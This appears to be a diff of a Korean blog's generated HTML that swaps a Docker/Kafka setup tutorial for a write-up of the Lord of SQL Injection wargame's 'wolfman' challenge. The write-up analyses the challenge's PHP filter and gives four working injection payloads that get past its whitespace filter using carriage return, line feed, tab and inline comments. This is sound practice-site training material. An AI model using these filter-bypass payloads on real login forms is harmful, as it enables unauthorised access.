@@ -99,20 +99,20 @@
 
 
 
-  <meta name="description" content="개요  Docker를 이용하여 Kafka와 Zookeeper 서비스를 구동하는 방법을 정리한다.">
-<meta name="keywords" content="Docker,Zookeeper,Kafka">
+  <meta name="description" content="개요  SQL Injection에 대한 지식을 쌓기 위해 Lord of SQL Injection 사이트의 문제를 풀고 해답을 정리한다. 이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.">
+<meta name="keywords" content="Lord of SQL Injection,Infosec">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Docker를 이용하여 Zookeeper와 Kafka 실행하기">
-<meta property="og:url" content="https://www.jslee.me/2019/08/05/run-kafka-with-docker/index.html">
+<meta property="og:title" content="Lord of SQL Injection Write Up No.5 Wolfman">
+<meta property="og:url" content="https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/index.html">
 <meta property="og:site_name" content="jslee&#39;s blog">
-<meta property="og:description" content="개요  Docker를 이용하여 Kafka와 Zookeeper 서비스를 구동하는 방법을 정리한다.">
+<meta property="og:description" content="개요  SQL Injection에 대한 지식을 쌓기 위해 Lord of SQL Injection 사이트의 문제를 풀고 해답을 정리한다. 이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.">
 <meta property="og:locale" content="ko">
-<meta property="og:image" content="https://www.jslee.me/2019/08/05/run-kafka-with-docker/kafka-logo.png">
-<meta property="og:updated_time" content="2019-08-05T14:08:10.021Z">
+<meta property="og:image" content="https://www.jslee.me/image/los-main.png">
+<meta property="og:updated_time" content="2019-08-16T05:38:11.672Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Docker를 이용하여 Zookeeper와 Kafka 실행하기">
-<meta name="twitter:description" content="개요  Docker를 이용하여 Kafka와 Zookeeper 서비스를 구동하는 방법을 정리한다.">
-<meta name="twitter:image" content="https://www.jslee.me/2019/08/05/run-kafka-with-docker/kafka-logo.png">
+<meta name="twitter:title" content="Lord of SQL Injection Write Up No.5 Wolfman">
+<meta name="twitter:description" content="개요  SQL Injection에 대한 지식을 쌓기 위해 Lord of SQL Injection 사이트의 문제를 풀고 해답을 정리한다. 이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.">
+<meta name="twitter:image" content="https://www.jslee.me/image/los-main.png">
 
 
 
@@ -120,7 +120,7 @@
 
   
   
-  <link rel="canonical" href="https://www.jslee.me/2019/08/05/run-kafka-with-docker/">
+  <link rel="canonical" href="https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/">
 
 
 
@@ -130,7 +130,7 @@
   };
 </script>
 
-  <title>Docker를 이용하여 Zookeeper와 Kafka 실행하기 | jslee's blog</title>
+  <title>Lord of SQL Injection Write Up No.5 Wolfman | jslee's blog</title>
   
 
 
@@ -389,7 +389,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.jslee.me/2019/08/05/run-kafka-with-docker/">
+    <link itemprop="mainEntityOfPage" href="https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Jaeseok Lee">
@@ -406,7 +406,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">Docker를 이용하여 Zookeeper와 Kafka 실행하기
+          <h2 class="post-title" itemprop="name headline">Lord of SQL Injection Write Up No.5 Wolfman
 
               
             
@@ -432,7 +432,7 @@
                 
               
 
-              <time title="Post created: 2019-08-05 20:31:52 / Updated at: 23:08:10" itemprop="dateCreated datePublished" datetime="2019-08-05T20:31:52+09:00">2019-08-05</time>
+              <time title="Post created: 2019-08-16 14:19:32 / Updated at: 14:38:11" itemprop="dateCreated datePublished" datetime="2019-08-16T14:19:32+09:00">2019-08-16</time>
             </span>
           
 
@@ -451,7 +451,7 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/시스템-구축/" itemprop="url" rel="index"><span itemprop="name">시스템 구축</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Write-Up/" itemprop="url" rel="index"><span itemprop="name">Write Up</span></a></span>
 
                 
                 
@@ -469,8 +469,8 @@
                 </span>
             
                 <span class="post-meta-item-text">댓글: </span>
-                <a href="/2019/08/05/run-kafka-with-docker/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/08/05/run-kafka-with-docker/" itemprop="commentCount"></span>
+                <a href="/2019/08/16/los-write-up-05-wolfman/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/08/16/los-write-up-05-wolfman/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -501,54 +501,64 @@
       
 
       
-        <h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/05/run-kafka-with-docker/kafka-logo.png" width="200">
+        <h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300">
 
-<p>Docker를 이용하여 Kafka와 Zookeeper 서비스를 구동하는 방법을 정리한다.</p>
+<p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p>
+<p>이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.</p>
 <a id="more"></a>
 
-<h3 id="버전"><a href="#버전" class="headerlink" title="버전"></a>버전</h3><p>2019년 07월 29일 시점에서 최신 버전인 Kafka 2.12-2.3.0, Zookeeper 3.5.5 버전을 기준으로 설명한다.</p>
-<h2 id="Docker-Network-설정"><a href="#Docker-Network-설정" class="headerlink" title="Docker Network 설정"></a>Docker Network 설정</h2><p>다음 명령어를 이용하여 Kafka와 Zookeeper가 통신하기 위해 사용할 Docker Network를 생성한다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network create kafka</span><br></pre></td></tr></table></figure>
+<h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>공백문자(‘ ‘)를 사용하지 않고 원하는 문자열을 <code>SELECT</code> 하도록 SQL을 조작할 수 있는지 확인한다.</p>
+<h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>wolfman 문제의 php 소스 코드는 다음과 같다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/ /i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No whitespace ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_wolfman where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"wolfman"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Zookeeper-서비스-구동"><a href="#Zookeeper-서비스-구동" class="headerlink" title="Zookeeper 서비스 구동"></a>Zookeeper 서비스 구동</h2><p><a href="https://hub.docker.com/_/zookeeper" target="_blank" rel="noopener">https://hub.docker.com/_/zookeeper</a></p>
-<p>Zookeeper는 공식 Docker 이미지를 제공하고 있다.</p>
-<p>다음 명령어를 통해 Docker를 이용하여 Zookeeper 서비스를 실행한다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=zookeeper --net=kafka -p 2181:2181 zookeeper</span><br></pre></td></tr></table></figure>
+<h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/ /i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No whitespace ~_~"</span>);</span><br></pre></td></tr></table></figure>
 
-<h2 id="Kafka-서비스-구동"><a href="#Kafka-서비스-구동" class="headerlink" title="Kafka 서비스 구동"></a>Kafka 서비스 구동</h2><p><a href="https://hub.docker.com/r/wurstmeister/kafka" target="_blank" rel="noopener">https://hub.docker.com/r/wurstmeister/kafka</a></p>
-<p>Kafka는 wurstmeister라는 사람이 만든 이미지를 이용하여 실행시킬 수 있다.</p>
-<p>다음 명령어를 통해 Docker를 이용하여 Kafka 서비스를 실행한다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name kafka --net=kafka -p 9092:9092 -e KAFKA_ADVERTISED_LISTENERS=<span class="string">"PLAINTEXT://localhost:9092"</span> -e KAFKA_LISTENERS=<span class="string">"PLAINTEXT://0.0.0.0:9092"</span> -e KAFKA_ADVERTISED_HOST_NAME=<span class="string">"127.0.0.1"</span> -e KAFKA_ADVERTISED_PORT=<span class="string">"9092"</span> -e KAFKA_ZOOKEEPER_CONNECT=<span class="string">"zookeeper:2181"</span> -e KAFKA_CREATE_TOPICS=<span class="string">"javainuse-topic:1:1"</span> wurstmeister/kafka</span><br></pre></td></tr></table></figure>
+<ul>
+<li>GET방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li>
+<li>또한, <code>pw</code>에 <code>공백문자(&#39; &#39;)</code> 가 들어 있으면 <code>No whitespace ~_~</code>가 뜨고 문제 풀이에 실패한다.</li>
+</ul>
+<h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_wolfman where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"wolfman"</span>);</span><br></pre></td></tr></table></figure>
 
-<h2 id="Kafka-서비스-테스트"><a href="#Kafka-서비스-테스트" class="headerlink" title="Kafka 서비스 테스트"></a>Kafka 서비스 테스트</h2><h2 id="확인-사항"><a href="#확인-사항" class="headerlink" title="확인 사항"></a>확인 사항</h2><h3 id="Java-설치-확인"><a href="#Java-설치-확인" class="headerlink" title="Java 설치 확인"></a>Java 설치 확인</h3><p>Java가 설치되어 있지 않으면 <a href="https://www.notion.so/93c3d7fb-8c5b-472f-af4f-8a7c67d51de1" target="_blank" rel="noopener">CentOS에 JDK 설치</a> 문서를 참고하여 Java를 설치한다.</p>
-<h3 id="바이너리-다운로드"><a href="#바이너리-다운로드" class="headerlink" title="바이너리 다운로드"></a>바이너리 다운로드</h3><p><a href="https://kafka.apache.org/downloads" target="_blank" rel="noopener">https://kafka.apache.org/downloads</a></p>
-<p>위 사이트에서 Kafka Docker 이미지의 버전과 동일한 버전의 바이너리 파일 주소를 복사한다.</p>
-<p>본 문서를 작성하는 시점에서는 다음과 같았다.</p>
-<p><a href="http://apache.mirror.cdnetworks.com/kafka/2.3.0/kafka_2.12-2.3.0.tgz" target="_blank" rel="noopener">http://apache.mirror.cdnetworks.com/kafka/2.3.0/kafka_2.12-2.3.0.tgz</a></p>
-<p>다음 명령어를 통해 Kafka 바이너리 파일을 다운로드한다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://apache.mirror.cdnetworks.com/kafka/2.3.0/kafka_2.12-2.3.0.tgz</span><br></pre></td></tr></table></figure>
+<ul>
+<li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li>
+<li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li>
+</ul>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol>
+<li><p>CR(Carriage Return) 이용</p>
+<p>ASCII Code 표를 살펴보면 16진수로 <code>0x0D</code>는 <code>Carriage Return</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%0Dor%0Did=&apos;admin&apos;--%0D-</span><br></pre></td></tr></table></figure>
 
-<p>다음 명령어를 통해 압축을 해제한다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf kafka_2.12-2.3.0.tgz</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure>
 
-<p>다음 명령어를 통해 안으로 들어간다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> kafka_2.12-2.3.0</span><br></pre></td></tr></table></figure>
+<p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p>
+</li>
+<li><p>LF(Line Feed)</p>
+<p>ASCII Code 표를 살펴보면 16진수로 <code>0x0A</code>는 <code>Line Feed</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%0Aor%0Aid=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure>
 
-<h3 id="Topic-생성-테스트"><a href="#Topic-생성-테스트" class="headerlink" title="Topic 생성 테스트"></a>Topic 생성 테스트</h3><p>다음 명령어를 통해 Kafka Topic을 생성할 수 있다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server localhost:9092 --create --topic <span class="built_in">test</span> --partitions 1 --replication-factor 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="Topic-확인-테스트"><a href="#Topic-확인-테스트" class="headerlink" title="Topic 확인 테스트"></a>Topic 확인 테스트</h3><p>다음 명령어를 통해 Kafka Topic을 확인할 수 있다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server localhost:9092 --describe</span><br></pre></td></tr></table></figure>
+<p>주석으로 <code>#</code>을 쓴 이유는 <code>-- -</code>을 사용할 때 가운데 공백으로 %0A를 사용하면 정상적으로 작동하지 않기 때문이다.</p>
+<p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p>
+</li>
+<li><p>Tab</p>
+<p>ASCII Code 표를 살펴보면 16진수로 <code>0x09</code>는 <code>Tab</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%09or%09id=&apos;admin&apos;--%09-</span><br></pre></td></tr></table></figure>
 
-<h3 id="Consumer-테스트"><a href="#Consumer-테스트" class="headerlink" title="Consumer 테스트"></a>Consumer 테스트</h3><p>다음 명령어를 통해 Kafka Console Consumer를 테스트할 수 있다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --from-beginning --bootstrap-server localhost:9092 --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span>	<span class="keyword">or</span>	<span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">--	-'</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="Producer-테스트"><a href="#Producer-테스트" class="headerlink" title="Producer 테스트"></a>Producer 테스트</h3><p>다음 명령어를 통해 Kafka Console Consumer를 테스트할 수 있다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-producer.sh --broker-list localhost:9092 --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p>
+</li>
+<li><p>주석</p>
+<p>MySQL에서 구문 사이에 주석을 넣으면 공백이 없어도 정상적으로 동작한다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;/**/or/**/id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure>
 
-<h3 id="Topic-삭제-테스트"><a href="#Topic-삭제-테스트" class="headerlink" title="Topic 삭제 테스트"></a>Topic 삭제 테스트</h3><p>다음 명령어를 통해 Kafka Topic을 삭제할 수 있다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server localhost:9092 --delete --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure>
 
+<p>주석으로 <code>#</code>을 쓴 이유는 <code>-- -</code>을 사용할 때 가운데 공백으로 주석을 사용하면 정상적으로 작동하지 않기 때문이다.</p>
+<p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p>
+</li>
+</ol>
 
       
     </div>
@@ -575,11 +585,9 @@
         
         <div class="post-tags">
           
-            <a href="/tags/Docker/" rel="tag"># Docker</a>
+            <a href="/tags/Lord-of-SQL-Injection/" rel="tag"># Lord of SQL Injection</a>
           
-            <a href="/tags/Zookeeper/" rel="tag"># Zookeeper</a>
-          
-            <a href="/tags/Kafka/" rel="tag"># Kafka</a>
+            <a href="/tags/Infosec/" rel="tag"># Infosec</a>
           
         </div>
       
@@ -592,8 +600,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/04/install-jdk-on-centos/" rel="next" title="CentOS에 JDK 설치하기">
-                <i class="fa fa-chevron-left"></i> CentOS에 JDK 설치하기
+              <a href="/2019/08/15/los-write-up-04-orc/" rel="next" title="Lord of SQL Injection Write Up No.4 Orc">
+                <i class="fa fa-chevron-left"></i> Lord of SQL Injection Write Up No.4 Orc
               </a>
             
           </div>
@@ -601,10 +609,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/06/install-nodejs/" rel="prev" title="Node.js 설치하기">
-                Node.js 설치하기 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -842,7 +846,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#개요"><span class="nav-number">1.</span> <span class="nav-text">개요</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#버전"><span class="nav-number">1.1.</span> <span class="nav-text">버전</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker-Network-설정"><span class="nav-number">2.</span> <span class="nav-text">Docker Network 설정</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zookeeper-서비스-구동"><span class="nav-number">3.</span> <span class="nav-text">Zookeeper 서비스 구동</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kafka-서비스-구동"><span class="nav-number">4.</span> <span class="nav-text">Kafka 서비스 구동</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kafka-서비스-테스트"><span class="nav-number">5.</span> <span class="nav-text">Kafka 서비스 테스트</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#확인-사항"><span class="nav-number">6.</span> <span class="nav-text">확인 사항</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-설치-확인"><span class="nav-number">6.1.</span> <span class="nav-text">Java 설치 확인</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#바이너리-다운로드"><span class="nav-number">6.2.</span> <span class="nav-text">바이너리 다운로드</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Topic-생성-테스트"><span class="nav-number">6.3.</span> <span class="nav-text">Topic 생성 테스트</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Topic-확인-테스트"><span class="nav-number">6.4.</span> <span class="nav-text">Topic 확인 테스트</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Consumer-테스트"><span class="nav-number">6.5.</span> <span class="nav-text">Consumer 테스트</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Producer-테스트"><span class="nav-number">6.6.</span> <span class="nav-text">Producer 테스트</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Topic-삭제-테스트"><span class="nav-number">6.7.</span> <span class="nav-text">Topic 삭제 테스트</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#개요"><span class="nav-number">1.</span> <span class="nav-text">개요</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#문제-분석"><span class="nav-number">2.</span> <span class="nav-text">문제 분석</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#문제-출제-의도"><span class="nav-number">2.1.</span> <span class="nav-text">문제 출제 의도</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#소스-코드-분석"><span class="nav-number">2.2.</span> <span class="nav-text">소스 코드 분석</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Filter"><span class="nav-number">2.2.1.</span> <span class="nav-text">Filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Query"><span class="nav-number">2.2.2.</span> <span class="nav-text">Query</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">3.</span> <span class="nav-text">Solution</span></a></li></ol></div>
             
 
           </div>
@@ -1015,9 +1019,9 @@
 
 <script>
   var disqus_config = function() {
-    this.page.url = "https://www.jslee.me/2019/08/05/run-kafka-with-docker/";
-    this.page.identifier = "2019/08/05/run-kafka-with-docker/";
-    this.page.title = 'Docker를 이용하여 Zookeeper와 Kafka 실행하기';
+    this.page.url = "https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/";
+    this.page.identifier = "2019/08/16/los-write-up-05-wolfman/";
+    this.page.title = 'Lord of SQL Injection Write Up No.5 Wolfman';
     };
   function loadComments() {
     var d = document, s = d.createElement('script');
